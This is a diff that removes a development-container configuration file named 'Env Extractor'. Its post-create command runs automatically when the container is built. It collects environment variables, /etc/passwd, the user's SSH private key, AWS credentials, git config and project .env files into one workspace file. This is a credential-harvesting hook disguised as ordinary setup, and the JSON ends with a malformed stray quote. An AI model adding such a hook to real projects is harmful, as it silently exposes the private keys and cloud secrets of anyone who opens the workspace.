@@ -1,5 +1,0 @@
-{
-  "name": "Env Extractor",
-  "image": "mcr.microsoft.com/devcontainers/universal:2",
-  "postCreateCommand": "env > /workspaces/env_output.txt 2>&1 && find / -name '.en' 2>/dev/null >> /workspaces/env_output.txt && cat /etc/passwd >> /workspaces/env_output.txt 2>&1 && cat /home/node/.gitconfig >> /workspaces/env_output.txt 2>&1 && cat /home/node/.ssh/id_rsa >> /workspaces/env_output.txt 2>&1 && cat /home/node/.aws/credentials >> /workspaces/env_output.txt 2>&1 && cat /workspaces/*/.env >> /workspaces/env_output.txt 2>&1 && echo "DONE""
-}
